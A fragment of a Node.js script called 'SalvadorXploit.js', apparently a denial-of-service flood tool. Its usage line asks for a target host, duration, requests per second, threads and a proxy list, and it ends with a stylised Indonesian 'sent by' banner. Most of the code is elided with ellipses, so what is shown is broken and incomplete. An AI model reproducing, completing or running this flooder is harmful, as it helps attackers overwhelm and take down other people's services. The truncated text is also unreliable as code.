const net = require("net");
 ...
 if (process.argv.length < 7){console.log('example: node SalvadorXploit.js <host> <time> <rps> <threads> <proxyfile>'); process.exit();}
 const headers = {};
...
`);
        console.log("𝕋𝕖𝕝𝕒𝕙 𝔻𝕚𝕜𝕚𝕣𝕚𝕞 𝕆𝕝𝕖𝕙 𝕊𝕒𝕝𝕧𝕒𝕕𝕠𝕣𝕏𝕡𝕝𝕠𝕚𝕥!\n");
